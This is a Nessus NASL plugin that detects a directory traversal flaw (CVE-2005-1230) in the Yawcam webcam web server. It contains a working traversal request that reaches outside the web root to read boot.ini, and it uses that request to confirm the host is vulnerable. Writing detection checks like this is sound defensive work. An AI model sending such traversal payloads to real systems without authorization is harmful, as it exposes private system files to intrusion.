#
#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  Ref: Donato Ferrante <fdonato at autistici.org>
#
#  This script is released under the GNU GPL v2
#

if (description)
{
 script_id(18176);
 script_cve_id("CVE-2005-1230");
 script_bugtraq_id(13295);
 script_version ("$Revision: 1.4 $");

 script_name(english:"Yawcam Directory Traversal");
 desc["english"] = "
Synopsis :

The remote web server itself is prone to directory traversal attacks. 

Description :

The remote host is running Yawcam, yet another web cam software. 

The installed version of Yawcam is vulnerable to a directory traversal
flaw.  By exploiting this issue, an attacker may be able to gain
access to material outside of the web root. 

See also :

http://marc.theaimsgroup.com/?l=bugtraq&m=111410564915961&w=2

Solution: 

Upgrade to Yawcam 0.2.6 or later.

Risk factor : 

Medium / CVSS Base Score : 4 
(AV:R/AC:L/Au:NR/C:P/A:N/I:N/B:C)";

 script_description(english:desc["english"]);
 script_summary(english:"Checks for directory traversal in Yawcam");
 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses", francais:"Abus de CGI");
 script_copyright(english:"This script is Copyright (C) 2005 David Maciejak");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 8081);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:8081);
if (! get_port_state(port) ) exit(0);

data = "local.html";
data = http_get(item:data, port:port);
buf = http_keepalive_send_recv(port:port, data:data, bodyonly:TRUE);
if( buf == NULL ) exit(0);

if ("<title>Yawcam</title>" >< buf)
{
  req = string("GET ..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini HTTP/1.0\r\n");
  soc = http_open_socket(port);
  if ( ! soc ) exit(0);
  send(socket:soc, data:req);
  res = http_recv_headers2(socket:soc);
  close (soc);
  if ("[boot loader]" >< res)
  {
	security_warning(port);	
  }
}
